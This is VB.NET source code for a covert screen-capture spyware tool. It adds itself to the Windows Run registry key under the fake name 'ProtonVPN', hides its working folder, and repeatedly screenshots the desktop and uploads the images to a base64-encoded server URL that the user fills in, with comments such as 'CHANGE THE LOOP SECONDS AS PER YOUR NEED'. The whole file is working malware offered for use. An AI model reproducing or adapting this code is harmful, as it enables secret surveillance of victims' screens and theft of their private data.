Imports System.IO
Imports System.Net
Imports System.Text
Imports System.Threading

Public Class Form1
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim folder As String = "C:\ProgramData\" & Environment.MachineName
        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run",
                                      "ProtonVPN", Application.ExecutablePath)
        Dim todaysdate As String = String.Format("{0:dd-MM-yyyy}", DateTime.Now)
        Dim server As String = BaseDecode1("XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX") 'YOUR SERVER URL IN BASE64 ENCODED'
        Dim webClient As New System.Net.WebClient
        Dim result2 As String = webClient.DownloadString(server & "processor.php?folder=" & Environment.MachineName)
        Dim result3 As String = webClient.DownloadString(server & "processor.php?folder=" & Environment.MachineName & "/" & todaysdate)
        While 1
            Try
                System.IO.Directory.CreateDirectory("C:\ProgramData\" & Environment.MachineName)
                FileSystem.SetAttr(folder, FileAttribute.System + FileAttribute.Hidden)
                FloridaCalling("C:\ProgramData\" & Environment.MachineName & "\" & DateTime.Now.ToString("HH-mm-ss") & ".jpg")
                My.Computer.Network.UploadFile("C:\ProgramData\" & Environment.MachineName & "\" & DateTime.Now.ToString("HH-mm-ss") & ".jpg", server & "processor.php?path=" & Environment.MachineName & "/" & todaysdate & "/")
                IO.File.Delete("C:\ProgramData\" & Environment.MachineName & "\" & DateTime.Now.ToString("HH-mm-ss") & ".jpg")
            Catch ex As Exception
            End Try
            Thread.Sleep(10000) 'CHANGE THE LOOP SECONDS AS PER YOUR NEED'
        End While
    End Sub
    Public Function FloridaCalling(ByVal path As String) As Boolean
        Dim screenSize As Size = New Size(My.Computer.Screen.Bounds.Width, My.Computer.Screen.Bounds.Height)
        Dim screenGrab As New Bitmap(My.Computer.Screen.Bounds.Width, My.Computer.Screen.Bounds.Height)
        Dim g As Graphics = Graphics.FromImage(screenGrab)
        g.CopyFromScreen(New Point(0, 0), New Point(0, 0), screenSize)
        screenGrab.Save(path, Imaging.ImageFormat.Jpeg)
        Return True
    End Function
    Public Function BaseDecode1(ByVal str As String) As String
        Dim base64Encoded As String = str
        Dim base64Decoded As String
        Dim data() As Byte
        data = System.Convert.FromBase64String(base64Encoded)
        base64Decoded = System.Text.ASCIIEncoding.ASCII.GetString(data)
        Return base64Decoded
    End Function
End Class
